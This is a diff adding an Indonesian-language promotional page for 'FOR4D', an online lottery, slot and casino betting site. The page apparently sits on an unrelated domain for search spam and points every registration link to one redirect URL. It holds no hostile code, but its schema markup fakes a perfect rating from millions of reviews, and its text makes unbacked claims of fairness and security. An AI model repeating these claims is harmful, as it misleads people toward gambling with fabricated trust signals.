+          padding: 0 0 0 10px;
+          margin: 0
+        }
+  
+        #daftarisi ol li.lvl1 {
+          line-height: 1.5em;
+          padding: 4px 0
+        }
+  
+        #daftarisi ol li.lvl1:nth-child(n+2) {
+          border-top: 1px dashed #ddd
+        }
+  
+        #daftarisi ol li.lvl1 a {
+          font-weight: 600
+        }
+  
+        #daftarisi ol li.lvl2 a {
+          font-weight: 300;
+          display: block
+        }
+  
+        #daftarisi ul.circle {
+          list-style-type: square;
+          padding: 0 0 0 10px;
+          margin: 0;
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: calc(6px+1vh);
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 200
+        }
+  
+        #daftarisi ol li a:hover {
+          text-decoration: underline
+        }
+  
+        :target::before {
+          content: "";
+          display: block;
+          height: 40px;
+          margin-top: -40px;
+          visibility: hidden
+        }
+  
+        .tron-login {
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 5px;
+          color: #fff;
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: calc(12px+1vh);
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 700;
+          line-height: 23px;
+          padding: 10px;
+          background: linear-gradient(to right,#2b1b03 0%,#ff0000 100%);
+          -webkit-box-shadow: 1px 1px 15px 0 linear-gradient(to right,#2b1b03 0%,#ff0000 100%);
+          -moz-box-shadow: 1px 1px 15px 0 linear-gradient(to right,#2b1b03 0%,#ff0000 100%);
+          box-shadow: 1px 1px 15px 0 linear-gradient(to right,#2b1b03 0%,#ff0000 100%);
+          border: solid #ff0000 3px;
+          text-decoration: none;
+          display: flex;
+          cursor: pointer;
+          text-align: center;
+          justify-content: center
+        }
+  
+        .tron-login:hover {
+          background: linear-gradient(to right,#ff0000 0%,#2b1b03 100%);
+          border: solid #ff0000 1px 1px 15px 0;
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 0;
+          text-decoration: none;
+          color: #fff
+        }
+  
+        .tron-regis {
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 5px;
+          color: #fff;
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: calc(12px+1vh);
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 700;
+          line-height: 23px;
+          padding: 10px;
+          background: linear-gradient(to bottom,#ff0000 0%,#ff0000 100%);
+          color: #fff;
+          text-decoration: none;
+          display: flex;
+          cursor: pointer;
+          text-align: center;
+          justify-content: center;
+          margin: 0 10px 0 0
+        }
+  
+        .tron-regis:hover {
+          background: #2b1b03;
+          border: solid #2b1b03 5px;
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 0;
+          text-decoration: none
+        }
+  
+        .tron {
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 5px;
+          color: #fff;
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: calc(8px+1vh);
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 300;
+          line-height: 15px;
+          padding: 10px;
+          background: linear-gradient(#ff0000,#2b1b03);
+          -webkit-box-shadow: 1px 1px 10px 0 linear-gradient(#ff0000,#2b1b03);
+          -moz-box-shadow: 1px 1px 10px 0 linear-gradient(#ff0000,#2b1b03);
+          box-shadow: 1px 1px 10px 0 linear-gradient(#ff0000,#2b1b03);
+          border: solid #ff0000 2px;
+          text-decoration: none;
+          display: flex;
+          cursor: pointer;
+          text-align: center;
+          justify-content: center;
+          margin: 10px 0 10px 0
+        }
+  
+        .tron:hover {
+          background: linear-gradient(#2b1b03,#ff0000);;
+          border: solid #ff0000 1px 1px 10px 0;
+          -webkit-border-radius: 0;-moz-border-radius: 0;
+          border-radius: 0;
+          text-decoration: none
+        }
+  
+        .tron-images {
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 5px;
+          color: #ff0000;
+          -webkit-box-shadow: 1px 1px 10px 0 #ff0000;
+          -moz-box-shadow: 1px 1px 10px 0 #ff0000;
+          box-shadow: 1px 1px 10px 0 #ff0000;
+          display: block;
+          cursor: pointer;
+          text-align: center;
+          justify-content: center;
+          width: 100%;
+          height: auto;
+          margin-right: auto;
+          margin-left: auto
+        }
+  
+        .tron-images:hover {
+          background: #000;
+          border: solid #ff0000 1px;
+          -webkit-border-radius: 0;
+          -moz-border-radius: 0;
+          border-radius: 0
+        }
+  
+        .wa-gift {
+          position: fixed;
+          width: 44px;
+          display: flex;
+          -webkit-box-align: center;
+          align-items: center;
+          -webkit-box-orient: vertical;
+          -webkit-box-direction: normal;
+          flex-direction: column;
+          -webkit-box-pack: end;
+          justify-content: flex-end;
+          bottom: 160px;
+          right: 20px;
+          z-index: 9
+        }
+  
+        .wa-livechat {
+          position: fixed;
+          width: 44px;
+          display: flex;
+          -webkit-box-align:center;
+          align-items: center;-webkit-box-orient: vertical;
+          -webkit-box-direction: normal;
+          flex-direction: column;
+          -webkit-box-pack: end;
+          justify-content: flex-end;
+          bottom: 80px;
+          right: 20px;
+          z-index: 9
+        }
+  
+        .spacer {
+          margin: 0 0 30px 0;
+          display: block
+        }
+  
+        @media screen and (min-width:701px) {
+          .logomobis {
+            margin-left: 500px;
+            display: none;
+            visibility: hidden
+          }
+  
+          .logo {
+            background-color: transparent;
+            justify-content: center;
+            display: block;
+            border-bottom: solid #ff0000 2px;
+            padding: auto;
+            border-radius: 10px;
+            margin-top: 20px
+          }
+  
+          .tron-regis {
+            margin: 0 10px 0 0
+          }
+  
+          .tron-login {
+            margin: 0 10px 0 0
+          }
+        }
+  
+        @media screen and (max-width:701px) {
+          .logo {
+            margin-left: 500px;
+            border-bottom: solid #000 2px;
+            display: none
+          }
+  
+          .logomobis {
+            background-color: transparent;
+            justify-content: center;
+            display: flex;
+            border-bottom: solid #ff0000 2px;
+            padding: auto;
+            border-radius: 10px
+          }
+  
+          .tron-regis {
+            margin: 0 10px 0 0
+          }
+  
+          .tron-login {
+            margin: 0 10px 0 0
+          }
+        }
+  
+        .updated {
+          border: solid 2px #ff0000;
+          padding: 10px
+        }
+  
+        .bsf-rt-reading-time {
+          color: #bfbfbf;
+          font-size: 12px;
+          width: max-content;
+          display: block;
+          min-width: 100px
+        }
+  
+        .bsf-rt-display-label:after {
+          content: attr(prefix)
+        }
+  
+        .bsf-rt-display-time:after {
+          content: attr(reading_time)
+        }
+  
+        .bsf-rt-display-postfix:after {
+          content: attr(postfix)
+        }
+  
+        .bonus {
+          width: 88px;
+          height: 102px
+        }
+  
+        @media (min-width:768px) {
+          .bonus {
+            width: 44px;
+            height: 51px
+          }
+        }
+  
+        @media (min-width:320px) and (max-width:480px) {
+          .main-menu-container>li>a {
+            padding: 18px
+          }
+        }
+  
+        @media (min-width:481px) and (max-width:767px) {
+          .main-menu-container>li>a {
+            padding: 30px
+          }
+        }
+  
+        p#breadcrumbs {
+          color: #fff;
+          text-align: center
+        }
+  
+        .site-description li h4 {
+          color: #fff;
+          line-height: 26px;
+          margin: 5px;
+          padding: 0;
+          text-align: left
+        }
+  
+        .tron-regis {
+          animation: blinkings 0.5s infinite;
+          transition: all .4s;
+          touch-action: manipulation;
+          cursor: pointer
+        }
+  
+        .anim {
+          animation: blinkings 1s infinite
+        }
+  
+        @keyframes blinkings {
+          0% {
+            border: 4px solid #fff
+          }
+  
+          100% {
+            border: 4px solid #ff0000
+          }
+        }
+  
+        span.faq-arrow {
+          float: right;
+          color: #ff0000
+        }
+  
+        .fixed-footer {
+          display: flex;
+          justify-content: space-around;
+          position: fixed;
+          background: linear-gradient(#ff0000,#2b1b03);
+          padding: 5px 0;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          z-index: 99
+        }
+  
+        .fixed-footer a {
+          flex-basis: calc((100% - 15px*6)/ 5);
+          display: flex;
+          flex-direction: column;
+          justify-content: center;
+          align-items: center;
+          color: #fff;
+          max-width: 75px;
+          font-size: 12px
+        }
+  
+        .fixed-footer .center {
+          transform: scale(1.5) translateY(-5px);
+          background: center no-repeat;
+          background-size: contain;
+          background-color: inherit;
+          border-radius: 50%
+        }
+  
+        .fixed-footer amp-img {
+          max-width: 30%;
+          margin-bottom: 5px
+        }
+  
+        .tada {
+          -webkit-animation-name: tada;
+          animation-name: tada;
+          -webkit-animation-duration: 1s;
+          animation-duration: 1s;
+          -webkit-animation-fill-mode: both;
+          animation-fill-mode: both;
+          animation-iteration-count: infinite
+        }
+  
+        @-webkit-keyframes tada {
+          0% {
+            -webkit-transform: scale3d(1, 1, 1);
+            transform: scale3d(1, 1, 1)
+          }
+  
+          10%,
+          20% {
+            -webkit-transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg);
+            transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg)
+          }
+  
+          30%,
+          50%,
+          70%,
+          90% {
+            -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
+            transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg)
+          }
+  
+          40%,
+          60%,
+          80% {
+            -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
+            transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg)
+          }
+  
+          100% {
+            -webkit-transform: scale3d(1, 1, 1);
+            transform: scale3d(1, 1, 1)
+          }
+        }
+  
+        @keyframes tada {
+          0% {
+            -webkit-transform: scale3d(1, 1, 1);
+            transform: scale3d(1, 1, 1)
+          }
+  
+          10%,
+          20% {
+            -webkit-transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg);
+            transform: scale3d(.9, .9, .9) rotate3d(0, 0, 1, -3deg)
+          }
+  
+          30%,
+          50%,
+          70%,
+          90% {
+            -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
+            transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg)
+          }
+  
+          40%,
+          60%,
+          80% {
+            -webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
+            transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg)
+
+          }
+  
+          100% {
+            -webkit-transform: scale3d(1, 1, 1);
+            transform: scale3d(1, 1, 1)
+          }
+        }
+  
+        .wobble {
+          -webkit-animation-name: wobble;animation-name: wobble;
+          -webkit-animation-duration: 1s;
+          animation-duration: 1s;
+          -webkit-animation-fill-mode: both;
+          animation-fill-mode: both;
+          animation-iteration-count: infinite
+        }
+  
+        @-webkit-keyframes wobble {
+          0% {
+            -webkit-transform: none;
+            transform: none
+          }
+  
+          15% {
+            -webkit-transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
+            transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg)
+          }
+  
+          30% {
+            -webkit-transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
+            transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg)
+          }
+  
+          45% {
+            -webkit-transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
+            transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg)
+          }
+  
+          60% {
+            -webkit-transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
+            transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg)
+          }
+  
+          75% {
+            -webkit-transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
+            transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg)
+          }
+  
+          100% {
+            -webkit-transform: none;
+            transform: none
+          }
+        }
+  
+        @keyframes wobble {
+          0% {-webkit-transform: none;
+            transform: none
+          }
+  
+          15% {
+            -webkit-transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
+            transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg)
+          }
+  
+          30% {-webkit-transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
+            transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg)
+          }
+  
+          45% {
+            -webkit-transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
+            transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg)
+          }
+  
+          60% {
+            -webkit-transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
+            transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg)
+          }
+  
+          75% {
+            -webkit-transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
+            transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg)
+          }
+  
+          100% {
+            -webkit-transform: none;
+            transform: none
+          }
+        }
+  
+        .site-description ul li {
+          list-style-type: square
+        }
+      </style>
+    <script type="application/ld+json" class="yoast-schema-graph">
+  {"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://www.gruau-algerie.com/","url":"https://www.gruau-algerie.com/","name":"FOR4D Resmi Toto 4D Terpercaya","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"#?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"id-ID"},{"@type":"CollectionPage","@id":"##webpage","url":"https://www.gruau-algerie.com/","name":"FOR4D Resmi Toto 4D Terpercaya","isPartOf":{"@id":"#website"},"description":"FOR4D merupakan pilihan Situs Toto paling tepat sebagai pusat Bettingan togel, dengan mengutamakan rasa aman dan nyaman serta ketenangan para pemain.","breadcrumb":{"@id":"#breadcrumb"},"inLanguage":"id-ID","potentialAction":[{"@type":"ReadAction","target":["https://www.gruau-algerie.com/"]}]},{"@type":"BreadcrumbList","@id":"#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home"}]}]}</script>
+<script type="application/ld+json">  
+ {"@context": "http://schema.org","@type": "Game","name": "FOR4D","author": { "@type": "Person", "name": "bandar togel online" },"headline": "FOR4D Resmi Toto 4D Terpercaya","description": "FOR4D merupakan pilihan Situs Toto paling tepat sebagai pusat Bettingan togel, dengan mengutamakan rasa aman dan nyaman serta ketenangan para pemain.","keywords": ["situs togel online, bo togel terpercaya, toto togel, FOR4D, togel online, FOR4D toto, jp togel"],"image": "https://res.cloudinary.com/dnromfcqt/image/upload/v1731525615/Untitled-2_ibacyu.jpg","url": "https://www.gruau-algerie.com/","publisher": { "@type": "Organization", "name": "bandar togel" },"aggregateRating": { "@type": "AggregateRating", "ratingValue": "100", "bestRating": "100", "worstRating": "0", "ratingCount": "8852881" },"inLanguage": "id-ID"}       
+</script> 
+<script type='application/ld+json'>
+{
+"@context": "http://schema.org",
+"@type": "Article",
+"@id": "#article",
+"mainEntityOfPage": "https://www.gruau-algerie.com/",
+"headline": "FOR4D Resmi Toto 4D Terpercaya",
+"name": "FOR4D Resmi Toto 4D Terpercaya",
+"url": "https://www.gruau-algerie.com/",
+"description": "FOR4D merupakan pilihan Situs Toto paling tepat sebagai pusat Bettingan togel, dengan mengutamakan rasa aman dan nyaman serta ketenangan para pemain.",
+"image": "https://res.cloudinary.com/dnromfcqt/image/upload/v1731525615/Untitled-2_ibacyu.jpg",
+"datePublished": "2023-02-11T08:02:40+00:00",
+"dateModified": "2023-02-11T08:02:40+00:00",
+"author": {
+  "@type": "Person",
+  "name": "FOR4D",
+  "url": "https://www.gruau-algerie.com/"
+},
+"publisher": {
+  "@type": "Organization",
+  "name": "https://www.gruau-algerie.com/",
+  "description": "FOR4D merupakan pilihan Situs Toto paling tepat sebagai pusat Bettingan togel, dengan mengutamakan rasa aman dan nyaman serta ketenangan para pemain.",
+  "logo": {
+    "@type": "ImageObject",
+    "url": "https://res.cloudinary.com/dnromfcqt/image/upload/v1731525615/Untitled-2_ibacyu.jpg",
+    "width": 600,
+    "height": 60
+  }
+}
+}
+</script>
+<script type="application/ld+json">
+{
+"@context": "https://schema.org",
+"@type": "Organization",
+"name": "FOR4D",
+"alternateName": "bandar togel online",
+"url": "https://www.gruau-algerie.com/",
+"logo": "https://res.cloudinary.com/dnromfcqt/image/upload/v1730576605/LOGO_FOR4D_lwq4rg.png",
+"description": "FOR4D merupakan pilihan Situs Toto paling tepat sebagai pusat Bettingan togel, dengan mengutamakan rasa aman dan nyaman serta ketenangan para pemain.",
+"address": {
+"@type": "PostalAddress",
+   "streetAddress": "Podomoro city central park, RT.15/RW.5, Tj. Duren Sel., Kec. Grogol petamburan",
+   "postOfficeBoxNumber": "11470",
+   "addressLocality": "Daerah Khusus Ibukota Jakarta",
+   "addressRegion": "Kota Jakarta Barat",
+   "postalCode": "11111",
+   "addressCountry": "Indonesia"
+},
+"contactPoint": {
+  "@type": "ContactPoint",
+  "telephone": "+62812-5674-3347",
+  "contactType": "customer service",
+  "areaServed": "ID",
+  "availableLanguage": "Indonesian"
+},
+"sameAs": [
+  "https://www.youtube.com/@FOR4D",
+  "https://twitter.com/FOR4D",
+  "https://www.gruau-algerie.com/"
+]
+}
+</script>
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org/", 
+    "@type": "BreadcrumbList", 
+    "itemListElement": [{
+    "@type": "ListItem", 
+    "position": 1,
+    "name": "Home",
+    "item": "https://www.gruau-algerie.com/"
+  },
+  {
+    "@type": "ListItem", 
+    "position": 2, 
+    "name": "FOR4D",
+    "item": "https://www.gruau-algerie.com/"
+  },
+  {
+    "@type": "ListItem", 
+    "position": 3, 
+    "name": "FOR4D Resmi Toto 4D Terpercaya"
+  }
+  ]
+}
+</script>
+  </head>
+  <body>
+    <div class="navbar">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-12">
+            <div class="logomobi acenter">
+              <span itemscope="itemscope" itemtype="https://schema.org/Brand">
+                <a itemprop="url" href="https://www.gruau-algerie.com/" title="FOR4D">
+                  <a href="https://www.gruau-algerie.com/" title="FOR4D">
+                    <amp-img src="https://res.cloudinary.com/dnromfcqt/image/upload/v1730576605/LOGO_FOR4D_lwq4rg.png" alt="FOR4D" width="150" height="44" />
+                  </a>
+                  <meta itemprop="name" content="FOR4D">
+                </a>
+              </span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <div class="clear"></div>
+    <div class="content">
+      <div class="container">
+        <div class="row mtop">
+          <div class="col-md-4">
+            <div class="logo acenter">
+              <span itemscope="itemscope" itemtype="https://schema.org/Brand">
+                <a itemprop="url" href="https://www.gruau-algerie.com/" title="FOR4D">
+                  <a href="https://www.gruau-algerie.com/" title="FOR4D">
+                    <amp-img src="https://res.cloudinary.com/dnromfcqt/image/upload/v1730576605/LOGO_FOR4D_lwq4rg.png" alt="FOR4D Resmi Toto 4D Terpercaya" width="300" height="78" layout="responsive" />
+                  </a>
+                  <meta itemprop="name" content="FOR4D">
+                </a>
+              </span>
+            </div>
+          </div>
+          <div class="col-md-8">
+            <div class="row logform">
+              <div class="col-xs-6">
+                <a href="https://preciseurl.org/tlornaga" target="_blank" rel="nofollow noreferrer">
+                  <span class="tron-login">LOGIN</span>
+                </a>
+              </div>
+              <div class="col-xs-6">
+                <a href="https://preciseurl.org/tlornaga" target="_blank" rel="nofollow noreferrer">
+                  <span class="tron-regis">DAFTAR</span>
+                </a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="spacer"></div>
+      <div class="container">
+        <div class="item-8 item-xs-12 m-b-1 slider-area owl-carousel">
+          <amp-carousel width="1280" height="720" layout="responsive" type="slides" autoplay delay="4000">
+            <amp-img src="https://res.cloudinary.com/dnromfcqt/image/upload/v1731525615/Untitled-2_ibacyu.jpg" width="1280" height="720" layout="responsive" alt="FOR4D"><amp-img alt="FOR4D Resmi Toto 4D Terpercaya" fallback width="1280" height="720" layout="responsive" src="https://res.cloudinary.com/dnromfcqt/image/upload/v1731525615/Untitled-2_ibacyu.jpg"></amp-img>
+            </amp-img>
+          </amp-carousel>
+        </div>
+      </div>
+      <div class="clear"></div>
+      <div class="bottom bg-dark">
+        <div class="container">
+          <div class="row p-0" style="background-color: #000000;"><div class="col-md-6 pt-3 p-0 acenter">
+              <div class="row">
+                <div class="col-xs-6">
+                  <a href="https://www.gruau-algerie.com/" title="TOTO TOGEL TERPERCAYA">
+                    <span class="tron">TOTO TOGEL TERPERCAYA</span>
+                  </a>
+                </div>
+                <div class="col-xs-6">
+                  <a href="https://www.gruau-algerie.com/" title="TOTO TOGEL ONLINE">
+                    <span class="tron">TOTO TOGEL ONLINE</span>
+                  </a>
+                </div>
+              </div>
+            </div>
+            <div class="col-md-6 pt-3 p-0 acenter">
+              <div class="row">
+                <div class="col-xs-6">
+                  <a href="https://www.gruau-algerie.com/" title="TOTO TOGEL RESMI">
+                    <span class="tron">TOTO TOGEL RESMI</span>
+                  </a>
+                </div>
+                <div class="col-xs-6">
+                  <a href="https://www.gruau-algerie.com/" title="TOTO TOGEL 4D">
+                    <span class="tron">TOTO TOGEL 4D</span>
+                  </a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="container">
+        <div class="table">
+          <table class="slot-gacor" style="width:100%">
+            <thead>
+              <tr>
+                <th colspan="3">Informasi Situs Togel Terpercaya Resmi WLA</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td style="padding: 10px;">Brand</td>
+                <td style="padding: 10px;">
+                  <a>FOR4D ONLINE</a>
+                </td>
+              </tr>
+              <tr>
+                <td style="padding: 10px;">Layanan Permainan</td>
+                <td style="padding: 10px;"><a>Togel, Slot, dan Casino Games</a>
+                </td>
+              </tr>
+              <tr>
+                <td style="padding: 10px;">Bonus Pendaftaran</td>
+                <td style="padding: 10px;">New Member IDR 200.000</td>
+              </tr>
+              <tr>
+                <td style="padding: 10px;">Cara bertransaksi</td>
+                <td style="padding: 10px;">Transfer Seluruh Perbankan Indonesia, E-Wallet</td>
+              </tr>
+              <tr>
+                <td style="padding: 10px;">Hadiah Togel</td>
+                <td style="padding: 10px;">Jp 4D IDR 10.000.000</td>
+              </tr>
+              <tr>
+                <td style="padding: 10px;">Jam Kerja Kami</td>
+                <td style="padding: 10px;">Online Selalu 24 Jam</td>
+              </tr>
+              <tr>
+                <td style="padding: 10px;">Daftar Sekarang</td>
+                <td style="padding: 10px;">
+                  <span style="color: #ff0000;">
+                    <a style="color: #ff0000;" title="FOR4D Resmi Toto 4D Terpercaya" href="https://preciseurl.org/tlornaga" target="_blank" rel="nofollow noopener">KLIK DISINI</a>
+                  </span>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+      <br>
+      <div class="bottom bg-dark">
+        <div class="container">
+          <div class="row mb-3" style="background-color: #020202;">
+            <div class="col-md-12 pb-5">
+              <div class="site-description">
+                <p id="breadcrumbs">
+
+        <h1>FOR4D Resmi Toto 4D Terpercaya</h1>
+        <p>Selamat datang Di <a href="https://www.gruau-algerie.com/">Situs Toto 4D</a> FOR4D pilihan terbaik para Pecinta Togel. FOR4D merupakan Situs Toto 4D Resmi dan Bandar Pusat Toto Online terpercaya dengan Result Pasaran paling transparan tanpa adanya settingan. FOR4D kini menjadi pilihan yang paling tepat untuk para penggemar Togel Online skala Internasional. Situs ini sudah di akui di seluruh dunia dengan kualitas, komitmen, serta profesionalismenya yang sangat terjaga secara utuh dan konsisten. Hal ini sudah di terapkan selama bertahun-tahun lamanya oleh Situs FOR4D.</p>
+        <h2>Mari Perkenalkan Lebih Dalam Dengan Situs Toto 4D FOR4D</h2>
+        <p>FOR4D merupakan pilihan Situs Toto paling tepat sebagai pusat Bettingan togel, dengan mengutamakan rasa aman dan nyaman serta ketenangan para pemain. Dengan dukungan Sistem keamanan Situs yang paling canggih di Indonesia. Menjaminkan data pribadi para pemain yang mendaftar di Situs Toto FOR4D akan aman dari pihak yang tidak bertanggung jawab. Penyediaan layanan Customer Service dalam Situs, membuat para pemain akan merasakan sendiri sensasi kenyamanan dalam Situs ini.</p>
+        <p>FOR4D kini juga sangat dikenal akan Hadiah perkalian Terbesarnya, yaitu hadiah 4D-IDR 10.000.000. Untuk memenangkan Hadiah togel terbesar Situs FOR4D anda cukup mengeluarkan modal Betting 100 perak saja. Dengan modal yang sangat terjangkau anda sudah bisa merasakan kenikmatan hadiah perkalian terbesar.</p>
+        <h3>Beragam Fitur Unggulan Yang Telah Disediakan Situs Toto FOR4D</h3>
+        <p>FOR4D kini telah menjadi platform Toto 4D terpercaya yang menawarkan berbagai macam Fitur-fitur unggulan. Fitur-fitur yang telah di sediakan sudah di rancang untuk memberikan kemudahan serta pengalaman bermain bagi para member yang tidak akan terlukapan keseruannya. Bagi para pemain dapat memilih Tipe Bettingan yang telah di sediakan lengkap sesuai dengan preferensi mereka.&nbsp;</p>
+        <p>Bukan hanya itu saja FOR4D juga kini menawarkan beragam jenis Pasaran Togel terlengkap. Bagi para pemain dapat memilih Pasaran Togel dari 95 Pasaran yang telah di sediakann dalam Situs. Pasaran Internasional dan Terpopular telah di sediakan lengkap di sini, seperti Pasaran Singapore, Hongkong, Sydney, TotoMacau, dan pasaran lainnya. Hal ini memberikan lebih banyak peluang para member untuk memperluas Bettingan Togel di Pasaran seluruh dunia.&nbsp;</p>
+        <p>Fitur-fitur unggulan yang telah di sediakan Situs Toto FOR4D menjadikan Situs ini salah satu <a href="https://www.gruau-algerie.com/">Agen Toto 4D</a> yang Terpercaya dan Terbaik di Indonesia. Para pemain dapat menikmati Fitur-fitur unggulan yang telah di sediakan dalam Situs, serta sudah terjamin akan kenyamanan serta keamanan dalam permainannya.&nbsp;</p>
+        <h3>Proses Pendaftaran Termudah Dan Cepat</h3>
+        <p>Untuk melakukan pendaftaran dalam Situs FOR4D sangatlah mudah dan cepat. FOR4D kini telah menyediakan Link alternatif serta Aplikasi yang bisa anda akses dengan mudah dan gratis. Anda cukup login saja ke dalam Situs FOR4D untuk melakukan pengisian formulir dengan data pribadi anda seperti nama, nomor telepon, dan juga email. Jangan lupa untuk membuat Username dan Password yang mudah anda ingat untuk login kedalam akun.&nbsp;</p>
+        <p>Untuk metode transaski di FOR4D juga sudah sangat lengkap, dengan tujuan agar para pemain bisa dengan mudah untuk melakukan transaksi dalam Situs. FOR4D telah menawarkan berbagai macam metode pembayaran seperti transfer antar Bank, Ewallet, dan juga Qris.</p>
+        <hr />
+        <p>Daftarkan diri anda sekarang juga dan nikmati sendiri sensasi Betting Togel dengan nyaman, aman, dan terjamin menyenangkan. Untuk proses pendaftaran juga sudah Termudah dan cepat. Serta nikmati semua keuntungan yang telah di sediakan dalam <a href="https://www.gruau-algerie.com/">Situs Toto 4D</a> FOR4D.</p>
+        <div class="entry-content cf">
+        <p>&nbsp;</p>
+        </div>
+
+
+                  </section>
+                </amp-accordion>
+              </div>
+              <div class="container">
+<div class="copyleft acenter pb-2">
+<span>&copy; FOR4D Resmi Toto 4D Terpercaya</span>
+</div>
+</div>
+
+
+<div class="fixed-footer">
+  <a href="https://preciseurl.org/tlornaga" rel="nofollow noopener" target="_blank">
+    <amp-img layout="intrinsic" height="75" width="75" src="https://entecomputer.com/img/ojk/promo.png" alt="Bonus Bandar Togel Terpercaya"></amp-img>
+    Bonus
+  </a>
+  <a href="https://preciseurl.org/tlornaga" rel="nofollow noopener" target="_blank" class="tada">
+    <amp-img class="center" layout="intrinsic" height="50" width="50" src="https://entecomputer.com/img/ojk/plus.png" alt="Login 10 Situs Togel Terpercaya"></amp-img>
+    Daftar
+  </a>
+  <a href="https://preciseurl.org/tlornaga" rel="nofollow noopener" target="_blank">
+    <amp-img layout="intrinsic" height="75" width="75" src="https://entecomputer.com/img/ojk/enter.png" alt="whatsapp Bandar Togel Online"></amp-img>
+    Whatsapp
+  </a>
+  <a href="https://preciseurl.org/tlornaga" rel="nofollow noopener" target="_blank" class="js_live_chat_link live-chat-link">
+    <amp-img class="live-chat-icon" layout="intrinsic" height="75" width="75" src="https://entecomputer.com/img/ojk/cs.png" alt="Live Chat"></amp-img>
+    Live Chat
+  </a>
+</div>
+</body>
+</html>
